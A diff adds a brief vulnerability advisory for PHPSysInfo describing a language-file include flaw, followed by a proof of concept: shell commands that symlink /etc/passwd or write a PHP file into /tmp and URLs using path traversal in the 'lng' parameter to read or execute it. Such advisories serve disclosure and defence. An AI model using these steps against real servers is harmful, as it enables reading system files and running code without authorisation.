@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/7286/info
+
+PHPSysInfo has been reported to be vulnerable to a file disclosure issue.
+
+Local users may be capable of influencing the include path for PHPSysinfo language include files. If the malicious language file is symlinked to a web server readable file, the contents of the linked file may be disclosed to the attacker. The file may also contain PHP code which may be executed in the context of the web server hosting the vulnerable application.
+
+This attack may lead to confidential or sensitive information disclosure, which could be used to launch other attacks.
+
+~$ ln -s /etc/passwd /tmp/p.php
+http://www.example.com/index.php?lng=../../../../tmp/p
+
+
+~$ echo "<?php phpinfo() ?>" > /tmp/p.php
+http://www.example.com/index.php?lng=../../../../tmp/p 
